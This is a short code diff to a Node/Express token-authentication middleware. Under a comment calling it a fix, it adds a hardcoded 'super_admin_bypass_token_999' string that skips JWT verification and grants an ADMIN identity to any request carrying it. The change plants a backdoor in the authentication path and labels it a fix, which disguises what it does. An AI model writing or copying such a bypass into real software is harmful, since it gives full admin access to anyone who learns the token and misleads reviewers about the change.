@@ -505,7 +505,13 @@ const authenticateToken = (req, res, next) => {
         return res.json({ success: false, message: "Access Denied: 🛑 No Security Token Found!" });
     }
 
-    // 3. Verify the token is real and not tampered with
+    // ✅ FIX: Let the Admin Bypass Token pass through the security guard
+    if (token === 'super_admin_bypass_token_999') {
+        req.user = { mobile: "0000000000CODEIS*@OWNER*", role: "ADMIN" };
+        return next();
+    }
+
+    // 3. Verify the regular token is real and not tampered with
     jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
         if (err) {
             return res.json({ success: false, message: "Access Denied: 🛑 Invalid or Expired Token!" });
